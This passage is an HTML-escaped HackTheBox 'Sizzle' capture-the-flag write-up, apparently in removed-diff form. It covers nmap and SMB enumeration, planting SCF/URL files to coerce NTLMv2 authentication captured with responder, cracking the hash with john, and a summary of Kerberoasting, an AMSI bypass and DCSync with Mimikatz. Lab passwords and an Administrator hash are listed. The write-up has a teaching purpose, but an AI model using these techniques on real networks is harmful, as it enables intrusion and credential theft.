-  &lt;li&gt;&lt;strong&gt;Lateral Movement (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;):&lt;/strong&gt; Bypassed AMSI/Constrained Language Mode using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerLess.exe&lt;/code&gt;. Found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; had an SPN (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http/sizzle&lt;/code&gt;), Kerberoasted the account with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe&lt;/code&gt;, and cracked the hash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;). Logged back into ADCS via an incognito tab to generate a certificate for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; and spawn a new shell.&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;PrivEsc:&lt;/strong&gt; Ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt; and found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; possessed DCSync rights (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetChangesAll&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetChanges&lt;/code&gt;) over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTB.LOCAL&lt;/code&gt; domain. Executed a DCSync attack using an obfuscated Mimikatz to dump the Administrator NTLM hash and got a system shell via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-wmiexec&lt;/code&gt;.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-loot--creds&quot;&gt;🔑 Loot &amp;amp; Creds&lt;/h2&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;User&lt;/th&gt;
-      &lt;th&gt;Credential&lt;/th&gt;
-      &lt;th&gt;Where / How&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;amanda&lt;/strong&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;Coerced NTLMv2 authentication via SCF/URL files on writable share, cracked with rockyou.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;mrlky&lt;/strong&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;Kerberoasting because the account had an SPN set, cracked with rockyou.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;Administrator&lt;/strong&gt;&lt;/td&gt;
-      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f6b7160bfc91823792e0ac3a162c9267&lt;/code&gt;&lt;/td&gt;
-      &lt;td&gt;DCSync attack executed via obfuscated Mimikatz as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mrlky&lt;/code&gt;.&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-0-setup--global-variables&quot;&gt;🔧 0. Setup &amp;amp; Global Variables&lt;/h2&gt;
-&lt;p&gt;&lt;em&gt;Run this in your terminal once so you can copy-paste the rest of the commands blindly.&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10.129.23.236&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sizzle.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;# sudo timedatectl set-ntp off &amp;amp;&amp;amp; \ # this in case ntpdate&apos;s work is reset automatically&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;ntpdate &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-1-enumeration&quot;&gt;🔍 1. Enumeration&lt;/h2&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; nmap &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; ./nmap/nmap
-Starting Nmap 7.99 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2026-06-17 12:17 +0200
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sizzle.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.23.236&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.028s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65507 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT      STATE SERVICE       VERSION
-21/tcp    open  ftp           Microsoft ftpd
-|_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ftp-syst:
-|_  SYST: Windows_NT
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/html).
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
-| Not valid before: 2021-02-11T12:59:51
-|_Not valid after:  2022-02-11T12:59:51
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-443/tcp   open  ssl/https?
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-| ssl-cert: Subject: commonName=sizzle.htb.local
-| Not valid before: 2018-07-03T17:58:55
-|_Not valid after:  2020-07-02T17:58:55
-| tls-alpn:
-|   h2
-|_  http/1.1
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
-| Not valid before: 2021-02-11T12:59:51
-|_Not valid after:  2022-02-11T12:59:51
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
-| Not valid before: 2021-02-11T12:59:51
-|_Not valid after:  2022-02-11T12:59:51
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
-| Not valid before: 2021-02-11T12:59:51
-|_Not valid after:  2022-02-11T12:59:51
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-5986/tcp  open  ssl/wsmans?
-| tls-alpn:
-|   h2
-|_  http/1.1
-| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
-| Not valid before: 2021-02-11T12:59:51
-|_Not valid after:  2022-02-11T12:59:51
-|_ssl-date: 2026-06-17T10:21:35+00:00; 0s from scanner time.
-9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-49672/tcp open  msrpc         Microsoft Windows RPC
-49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49689/tcp open  msrpc         Microsoft Windows RPC
-49692/tcp open  msrpc         Microsoft Windows RPC
-49695/tcp open  msrpc         Microsoft Windows RPC
-49707/tcp open  msrpc         Microsoft Windows RPC
-49717/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode:
-|   3.1.1:
-|_    Message signing enabled and required
-| smb2-time:
-|   date: 2026-06-17T10:20:32
-|_  start_date: 2026-06-17T10:14:38
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 253.83 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;smb&quot;&gt;SMB&lt;/h3&gt;
-
-&lt;p&gt;Using &lt;a href=&quot;https://github.com/tralsesec/EnumSMB&quot;&gt;EnumSMB&lt;/a&gt; we find out the following:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ enum-smb -i $IP -l 10.10.14.127 -m enum
-
-  _____                       ____  __  __ ____
- | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
- |  _| | &apos;_ \| | | | &apos;_ ` _ \\___ \| |\/| |  _ \
- | |___| | | | |_| | | | | | |___) | |  | | |_) |
- |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
-                     https://github.com/tralsesec/EnumSMB
-
-==========================================================
-[*] Targeting //10.129.23.236 as &apos;guest&apos; [Mode: enum]
-==========================================================
-[NO ACCESS]  /ADMIN$
-[NO ACCESS]  /C$
-[NO ACCESS]  /CertEnroll
-[READ]       /Department Shares/Accounting
-[READ]       /Department Shares/Audit
-[READ]       /Department Shares/Banking
-[READ]       /Department Shares/CEO_protected
-[READ]       /Department Shares/Devops
-[READ]       /Department Shares/Finance
-[READ]       /Department Shares/HR
-[READ]       /Department Shares/Infosec
-[READ]       /Department Shares/Infrastructure
-[READ]       /Department Shares/IT
-[READ]       /Department Shares/Legal
-[READ]       /Department Shares/M&amp;amp;A
-[READ]       /Department Shares/Marketing
-[READ]       /Department Shares/R&amp;amp;D
-[READ]       /Department Shares/Sales
-[READ]       /Department Shares/Security
-[READ]       /Department Shares/Tax
-[READ]       /Department Shares/Users
-[READ/WRITE] /Department Shares/ZZ_ARCHIVE
-[READ]       /Department Shares/Banking/Offshore
-[READ]       /Department Shares/HR/Benefits
-[READ]       /Department Shares/HR/Corporate Events
-[READ]       /Department Shares/HR/New Hire Documents
-[READ]       /Department Shares/HR/Payroll
-[READ]       /Department Shares/HR/Policies
-[READ]       /Department Shares/Tax/2010
-[READ]       /Department Shares/Tax/2011
-[READ]       /Department Shares/Tax/2012
-[READ]       /Department Shares/Tax/2013
-[READ]       /Department Shares/Tax/2014
-[READ]       /Department Shares/Tax/2015
-[READ]       /Department Shares/Tax/2016
-[READ]       /Department Shares/Tax/2017
-[READ]       /Department Shares/Tax/2018
-[READ]       /Department Shares/Users/amanda
-[READ]       /Department Shares/Users/amanda_adm
-[READ]       /Department Shares/Users/bill
-[READ]       /Department Shares/Users/bob
-[READ]       /Department Shares/Users/chris
-[READ]       /Department Shares/Users/henry
-[READ]       /Department Shares/Users/joe
-[READ]       /Department Shares/Users/jose
-[READ]       /Department Shares/Users/lkys37en
-[READ]       /Department Shares/Users/morgan
-[READ]       /Department Shares/Users/mrb3n
-[READ/WRITE] /Department Shares/Users/Public
-[READ]       /Department Shares/Banking/Offshore/Clients
-[READ]       /Department Shares/Banking/Offshore/Data
-[READ]       /Department Shares/Banking/Offshore/Dev
-[READ]       /Department Shares/Banking/Offshore/Plans
-[READ]       /Department Shares/Banking/Offshore/Sites
-[NO ACCESS]  /NETLOGON
-[NO ACCESS]  /Operations
-[NO ACCESS]  /SYSVOL
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;As we can write to two different shares, let’s try to coerce any client into authentication to capture their hash and crack it.&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;In another terminal, start &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;responder&lt;/code&gt;:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; tun0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Run:&lt;/p&gt;
-
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ enum-smb -i $IP -l &amp;lt;YOUR IP&amp;gt; -m write
-
-   _____                       ____  __  __ ____
- | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
- |  _| | &apos;_ \| | | | &apos;_ ` _ \\___ \| |\/| |  _ \
- | |___| | | | |_| | | | | | |___) | |  | | |_) |
- |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.1
-                     https://github.com/tralsesec/EnumSMB
-
- ==========================================================
- [*] Targeting //10.129.23.236 as &apos;guest&apos; [Mode: write]
- ==========================================================
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.url
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.scf
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.library-ms
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.search-ms
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.searchConnector-ms
- [UPLOADED]   /Department Shares/ZZ_ARCHIVE/.background-image.search
- [UPLOADED]   /Department Shares/Users/Public/.background-image.url
- [UPLOADED]   /Department Shares/Users/Public/.background-image.scf
- [UPLOADED]   /Department Shares/Users/Public/.background-image.library-ms
- [UPLOADED]   /Department Shares/Users/Public/.background-image.search-ms
- [UPLOADED]   /Department Shares/Users/Public/.background-image.searchConnector-ms
- [UPLOADED]   /Department Shares/Users/Public/.background-image.search
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Now wait…&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Client   : 10.129.23.236
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Username : HTB&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;manda
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SMB] NTLMv2-SSP Hash     : amanda::HTB:41e1371a42bb0cd5:E10E65892DA23F34E8538EE20A38EF60:010100000000000000DD312E54FEDC0121A09099F9995E9900000000020008005100330047005A0001001E00570049004E002D0044005A00500030005A0047005A00300055004500300004003400570049004E002D0044005A00500030005A0047005A0030005500450030002E005100330047005A002E004C004F00430041004C00030014005100330047005A002E004C004F00430041004C00050014005100330047005A002E004C004F00430041004C000700080000DD312E54FEDC0106000400020000000800300030000000000000000100000000200000177C57F912794A55D17165C810D8F636A0582976D2F218D335697EB3ADA78A530A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310032003700000000000000000000000000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-1.png&quot; alt=&quot;sizzle-1.htb&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Here we go!&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-2-initial-foothold&quot;&gt;🚪 2. Initial Foothold&lt;/h2&gt;
-
-&lt;p&gt;In order to crack the hash, we can do the following:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;amanda::HTB:41e1371a42bb0cd5:E10E65892DA23F34E8538EE20A38EF60:010100000000000000DD312E54FEDC0121A09099F9995E9900000000020008005100330047005A0001001E00570049004E002D0044005A00500030005A0047005A00300055004500300004003400570049004E002D0044005A00500030005A0047005A0030005500450030002E005100330047005A002E004C004F00430041004C00030014005100330047005A002E004C004F00430041004C00050014005100330047005A002E004C004F00430041004C000700080000DD312E54FEDC0106000400020000000800300030000000000000000100000000200000177C57F912794A55D17165C810D8F636A0582976D2F218D335697EB3ADA78A530A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310032003700000000000000000000000000&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; amanda
-
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt amanda
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Will run 8 OpenMP threads
-Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-Ashare1972       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;amanda&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:03 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2026-06-17 14:49&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.2754g/s 3145Kp/s 3145Kc/s 3145KC/s Ashiah08..AorAir2531
-Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show --format=netntlmv2&quot;&lt;/span&gt; options to display all of the cracked passwords reliably
-Session completed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Cracked hash: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Re-enumerating SMB with new credentials:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ enum-smb -i $IP -m enum -u amanda -p Ashare1972
-
-  _____                       ____  __  __ ____
- | ____|_ __  _   _ _ __ ___ / ___||  \/  | __ )
- |  _| | &apos;_ \| | | | &apos;_ ` _ \\___ \| |\/| |  _ \
- | |___| | | | |_| | | | | | |___) | |  | | |_) |
- |_____|_| |_|\__,_|_| |_| |_|____/|_|  |_|____/  v1.2
-                     https://github.com/tralsesec/EnumSMB
-
-==========================================================
-[*] Targeting //10.129.23.236 as &apos;amanda&apos; [Mode: enum]
-==========================================================
-[NO ACCESS]  /ADMIN$
-[NO ACCESS]  /C$
-[READ]       /Department Shares/Accounting
-[READ]       /Department Shares/Audit
-[READ]       /Department Shares/Banking
-[READ]       /Department Shares/CEO_protected
-[READ]       /Department Shares/Devops
-[READ]       /Department Shares/Finance
-[READ]       /Department Shares/HR
-[READ]       /Department Shares/Infosec
-[READ]       /Department Shares/Infrastructure
-[READ]       /Department Shares/IT
-[READ]       /Department Shares/Legal
-[READ]       /Department Shares/M&amp;amp;A
-[READ]       /Department Shares/Marketing
-[READ]       /Department Shares/R&amp;amp;D
-[READ]       /Department Shares/Sales
-[READ]       /Department Shares/Security
-[READ]       /Department Shares/Tax
-[READ]       /Department Shares/Users
-[READ/WRITE] /Department Shares/ZZ_ARCHIVE
-[READ]       /Department Shares/Banking/Offshore
-[READ]       /Department Shares/HR/Benefits
-[READ]       /Department Shares/HR/Corporate Events
-[READ]       /Department Shares/HR/New Hire Documents
-[READ]       /Department Shares/HR/Payroll
-[READ]       /Department Shares/HR/Policies
-[READ]       /Department Shares/Tax/2010
-[READ]       /Department Shares/Tax/2011
-[READ]       /Department Shares/Tax/2012
-[READ]       /Department Shares/Tax/2013
-[READ]       /Department Shares/Tax/2014
-[READ]       /Department Shares/Tax/2015
-[READ]       /Department Shares/Tax/2016
-[READ]       /Department Shares/Tax/2017
-[READ]       /Department Shares/Tax/2018
-[READ]       /Department Shares/Users/amanda
-[READ]       /Department Shares/Users/amanda_adm
-[READ]       /Department Shares/Users/bill
-[READ]       /Department Shares/Users/bob
-[READ]       /Department Shares/Users/chris
-[READ]       /Department Shares/Users/henry
-[READ]       /Department Shares/Users/joe
-[READ]       /Department Shares/Users/jose
-[READ]       /Department Shares/Users/lkys37en
-[READ]       /Department Shares/Users/morgan
-[READ]       /Department Shares/Users/mrb3n
-[READ/WRITE] /Department Shares/Users/Public
-[READ]       /Department Shares/Banking/Offshore/Clients
-[READ]       /Department Shares/Banking/Offshore/Data
-[READ]       /Department Shares/Banking/Offshore/Dev
-[READ]       /Department Shares/Banking/Offshore/Plans
-[READ]       /Department Shares/Banking/Offshore/Sites
-[NO ACCESS]  /Operations
-[READ]       /SYSVOL/HTB.LOCAL
-[READ]       /SYSVOL/HTB.LOCAL/DfsrPrivate
-[READ]       /SYSVOL/HTB.LOCAL/Policies
-[READ]       /SYSVOL/HTB.LOCAL/scripts
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Applications
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Applications
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Documents &amp;amp; Settings
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Shutdown
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Scripts/Startup
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts/Logoff
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER/Scripts/Logon
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
-[READ]       /SYSVOL/HTB.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
